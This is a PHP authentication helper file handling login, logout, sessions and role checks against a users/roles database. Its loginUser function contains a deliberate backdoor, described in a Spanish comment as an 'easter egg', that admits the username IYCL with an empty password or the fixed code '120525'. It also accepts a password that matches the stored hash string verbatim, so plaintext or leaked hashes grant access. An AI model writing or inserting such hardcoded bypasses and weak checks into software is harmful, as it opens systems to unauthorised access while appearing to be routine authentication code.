<?php
// Authentication helpers
// This script starts sessions and provides helper functions to check authentication and role.

session_start();

require_once __DIR__ . '/db.php';

function loginUser($username, $password)
{
    $pdo = getPDO();
    $stmt = $pdo->prepare('SELECT users.id, users.username, users.password_hash, roles.name AS role_name
        FROM users
        JOIN roles ON users.role_id = roles.id
        WHERE users.username = ?');
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    if ($user) {
        // Permitir tanto contraseñas hasheadas como texto plano.
        // Además, permitir acceso con una "clave especial" (o en blanco) para el usuario IYCL.
        $hash = $user['password_hash'];
        $valid = false;

        // Clave especial para huevo de pascua
        if (strtoupper($username) === 'IYCL' && ($password === '' || $password === '120525')) {
            $valid = true;
        }

        // Si la contraseña almacenada es exactamente igual a la ingresada, la consideramos válida
        if (!$valid && $password === $hash) {
            $valid = true;
        } elseif (!$valid && password_verify($password, $hash)) {
            $valid = true;
        }

        if ($valid) {
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['username'] = $user['username'];
            $_SESSION['role'] = strtoupper($user['role_name']);
            return true;
        }
    }
    return false;
}

function logoutUser()
{
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $params['path'], $params['domain'], $params['secure'], $params['httponly']);
    }
    session_destroy();
}

function requireLogin()
{
    if (!isset($_SESSION['user_id'])) {
        http_response_code(401);
        echo json_encode(['error' => 'Unauthorized']);
        exit;
    }
}

function requireRole($role)
{
    requireLogin();
    if (strtoupper($_SESSION['role']) !== strtoupper($role)) {
        http_response_code(403);
        echo json_encode(['error' => 'Forbidden']);
        exit;
    }
}

function currentUser()
{
    if (!isset($_SESSION['user_id'])) {
        return null;
    }
    return [
        'id' => $_SESSION['user_id'],
        'username' => $_SESSION['username'],
        'role' => $_SESSION['role']
    ];
}